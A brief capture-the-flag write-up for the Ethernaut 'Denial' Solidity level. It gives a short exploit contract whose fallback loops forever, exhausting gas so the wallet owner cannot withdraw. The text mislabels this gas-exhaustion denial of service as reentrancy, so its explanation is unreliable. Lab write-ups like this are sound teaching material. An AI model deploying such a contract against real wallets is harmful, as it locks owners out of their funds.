# Ethernaut Level 20: Denial

https://ethernaut.openzeppelin.com/level/20

```
This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
```


## Solution

This is lassic reentrancy attack. 
Founds are sent to `partner` before are sent to `owner`. If we manage to execute rentrancy attack on each funds that are sent `owner` will not be able to withdraw any money.  

```
contract ExploitContract {
    Denial denial;

    constructor(address payable _denial) {
        denial = Denial(_denial);
        denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        while (true) {}
    }

    function exploit() public {
        denial.withdraw();
    }
}
```